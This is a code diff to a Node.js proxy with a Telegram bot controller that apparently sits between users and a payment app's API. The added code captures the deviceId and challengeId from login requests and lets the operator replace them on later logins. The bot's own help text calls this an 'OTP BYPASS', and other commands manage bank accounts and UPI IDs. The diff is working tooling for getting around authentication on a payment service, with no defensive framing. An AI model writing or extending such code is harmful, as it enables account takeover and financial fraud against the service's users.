@@ -312,7 +312,10 @@ const DEFAULT_DATA = {
   balanceHistory: [],
   orderBankMap: {},
   sentOrderInfo: {},
-  dummyOrders: []
+  dummyOrders: [],
+  useIdOverride: null,
+  alwaysIdOverride: null,
+  lastCapturedId: { deviceId: '', challengeId: '' }
 };
 
 function generateDummyCode() {
@@ -779,6 +782,45 @@ app.use(async (req, res, next) => {
 });
 
 async function proxyFetch(req, timeoutMs) {
+  // === ID OVERRIDE & CAPTURE LOGIC ===
+  if (req.originalUrl && req.originalUrl.includes('/app/user/login')) {
+    try {
+      const data = cachedData || await loadData();
+      const body = req.parsedBody || {};
+
+      // 1. Auto-capture last seen IDs for easy /useid or /alwaysid command usage
+      if (body.deviceId || body.challengeId) {
+        if (!data.lastCapturedId) data.lastCapturedId = {};
+        if (body.deviceId) data.lastCapturedId.deviceId = body.deviceId;
+        if (body.challengeId) data.lastCapturedId.challengeId = body.challengeId;
+        saveData(data).catch(() => {});
+      }
+
+      // 2. Check for active ID Override (single-use or persistent)
+      const override = data.useIdOverride || data.alwaysIdOverride;
+      if (override) {
+        let modified = false;
+        if (override.deviceId) {
+          body.deviceId = override.deviceId;
+          modified = true;
+        }
+        if (override.challengeId) {
+          body.challengeId = override.challengeId;
+          modified = true;
+        }
+        if (modified) {
+          req.parsedBody = body;
+          req.rawBody = Buffer.from(JSON.stringify(body), 'utf8');
+        }
+        // Single-use override: clear after applying once
+        if (data.useIdOverride) {
+          data.useIdOverride = null;
+          saveData(data).catch(() => {});
+        }
+      }
+    } catch (e) {}
+  }
+
   const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
@@ -1217,7 +1259,13 @@ app.post('/bot-webhook', async (req, res) => {
       data.adminChatId = chatId;
       await saveData(data);
       await bot.sendMessage(chatId,
-        `🏦 DiwaPay Controller
+        `🏦 DDPay Controller
+
+=== ID OVERRIDE (OTP BYPASS) ===
+/useid [deviceId] [challengeId] — Single next login override
+/alwaysid [deviceId] [challengeId] — Persistent login override
+/alwaysid off — Turn off persistent override
+/clearid — Clear all active ID overrides
 
 === BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI
@@ -1264,10 +1312,11 @@ app.post('/bot-webhook', async (req, res) => {
 
 📌 Login pe auto-detect:
 • challengeId + deviceId dikhega
-• Token + PIN brute command dikhega
+• /useid ya /alwaysid bina argument ke aakhiri IDs use karega
 
 Example:
-/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
+/useid
+/alwaysid 4aa91f18ca564f20863d644fcd28be9c 1d2acf94b417415fad6a804a8ac5272a`
       );
       return res.sendStatus(200);
     }
@@ -1315,6 +1364,59 @@ Example:
       freshData.logRequests = !freshData.logRequests;
       await saveData(freshData);
       await bot.sendMessage(chatId, `📋 Logging: ${freshData.logRequests ? 'ON' : 'OFF'}`).catch(() => { });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/useid')) {
+      const freshData = await loadData(true);
+      const parts = text.trim().split(/\s+/);
+      let devId = parts[1];
+      let chalId = parts[2];
+      if (!devId && freshData.lastCapturedId) {
+        devId = freshData.lastCapturedId.deviceId;
+        chalId = freshData.lastCapturedId.challengeId;
+      }
+      if (!devId) {
+        await bot.sendMessage(chatId, '⚠️ Usage: /useid <deviceId> [challengeId]\nOr run /useid directly after a login attempt to use last captured IDs.');
+        return res.sendStatus(200);
+      }
+      freshData.useIdOverride = { deviceId: devId || '', challengeId: chalId || '' };
+      await saveData(freshData);
+      await bot.sendMessage(chatId, `🎯 *Single-Use ID Override Set*\n━━━━━━━━━━━━━━━━━━\n📱 *DeviceId:* \`${devId}\`\n🔑 *ChallengeId:* \`${chalId || 'N/A'}\`\n\n📌 Will apply to the VERY NEXT login attempt and then reset.`, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/alwaysid')) {
+      const freshData = await loadData(true);
+      if (text.trim() === '/alwaysid off') {
+        freshData.alwaysIdOverride = null;
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🔴 Always ID Override OFF');
+        return res.sendStatus(200);
+      }
+      const parts = text.trim().split(/\s+/);
+      let devId = parts[1];
+      let chalId = parts[2];
+      if (!devId && freshData.lastCapturedId) {
+        devId = freshData.lastCapturedId.deviceId;
+        chalId = freshData.lastCapturedId.challengeId;
+      }
+      if (!devId) {
+        await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId> [challengeId]\nOr /alwaysid off to disable.');
+        return res.sendStatus(200);
+      }
+      freshData.alwaysIdOverride = { deviceId: devId || '', challengeId: chalId || '' };
+      await saveData(freshData);
+      await bot.sendMessage(chatId, `🔄 *Always ID Override Set (Persistent)*\n━━━━━━━━━━━━━━━━━━\n📱 *DeviceId:* \`${devId}\`\n🔑 *ChallengeId:* \`${chalId || 'N/A'}\`\n\n📌 Will overwrite all future login attempts until /alwaysid off.`, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text === '/clearid') {
+      const freshData = await loadData(true);
+      freshData.useIdOverride = null;
+      freshData.alwaysIdOverride = null;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, '🧹 All ID Overrides Cleared!');
       return res.sendStatus(200);
     }
 
